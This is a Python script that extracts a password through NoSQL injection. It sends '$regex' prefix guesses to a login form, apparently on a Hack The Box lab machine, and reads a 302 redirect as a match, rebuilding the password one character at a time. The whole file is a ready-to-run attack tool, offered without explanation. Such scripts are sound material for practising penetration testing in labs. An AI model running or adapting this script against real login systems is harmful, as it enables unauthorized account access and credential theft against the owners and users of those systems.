# python3 nosql-enum.py
import requests
import re
import os

#=================================================
# to send this script traffic through Burp Suite
proxy = 'http://localhost:8080'

os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy
# =================================================

url = 'http://staging-order.mango.htb'
cookies = 'PHPSESSID='

chars = range(33, 127)
p1 = ''


def rqst(p1):
    data1 = "username=mango&password[$regex]=^"+p1+"&login=login"
    r = requests.post(url, data=data1, verify=False, allow_redirects=False,
                      headers={'Content-Type': 'application/x-www-form-urlencoded'})

    if r.status_code == 302:
        P1 = p1
        print('\nfound so far: ' + p1)
	
        for i in chars:
                if chr(i) in ['.','?','*','^','+','&','|']: 
                    p1 = P1 +'\\'+ chr(i) # to escape chars
                    rqst(p1)
                else:
                    p1 = P1 + chr(i)
                    print('\r'+p1, flush=False, end='')
                    if len(p1) >=4:
                            x = re.search(".*\$\$$", p1) # exit condition if $ (end of line) was found will exit and print the string without $
                            if x:
                                print('\n\nthis is the string: ' + p1[:-2])
                                exit()

                    rqst(p1)
        return


print(rqst(p1))
